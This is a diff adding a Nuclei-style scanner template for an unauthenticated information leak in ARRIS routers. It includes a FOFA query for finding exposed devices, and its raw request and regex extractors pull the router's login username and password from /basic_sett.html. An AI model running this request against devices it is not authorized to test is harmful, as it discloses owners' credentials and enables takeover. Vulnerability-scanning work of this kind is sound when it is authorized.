@@ -1,0 +1,32 @@
+id: arris-route-basic_sett-unauth
+info:
+  name: arris-route-basic_sett-unauth
+  author: unknow
+  severity: high
+  description: arris 路由器 basic_sett 存在未授权信息泄露漏洞。
+  tags: arris,unauth
+  metadata:
+    fofa-qeury: body="base64encode(document.tF.pws.value)" || body="ARRIS TR3300"
+http:
+  - raw:
+      - |
+        GET /basic_sett.html HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 
+    extractors:
+      - type: regex
+        name: user
+        part: body
+        group: 1
+        regex:
+          - 'name=\"login_user\" value=\"(.*)\" disabled'
+      - type: regex
+        name: password
+        part: body
+        group: 1
+        regex:
+          - 'cur_passwd\" value=\"(.*)\"'             
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body,"name=\"cur_passwd\" value=\"Q0JCM0NCQjNDQkIz\"")'
